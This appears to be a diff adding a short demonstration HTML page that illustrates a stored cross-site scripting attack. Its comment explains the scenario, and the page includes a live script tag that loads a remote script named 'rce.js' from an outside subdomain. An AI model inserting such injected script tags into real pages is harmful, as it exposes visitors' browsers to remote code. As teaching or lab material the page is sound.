@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Main Application</title>
+</head>
+<body>
+<h1>Main Application</h1>
+<p>This is the main application. It is vulnerable to a stored XSS attack.</p>
+
+<!--
+In a real attack, the following script tag would be injected into the main application's database
+and then rendered on this page. This would cause the victim's browser to load the malicious script
+from the compromised subdomain.
+-->
+
+<script src="https://brand.base.org/rce.js"></script>
+
+</body>
+</html>
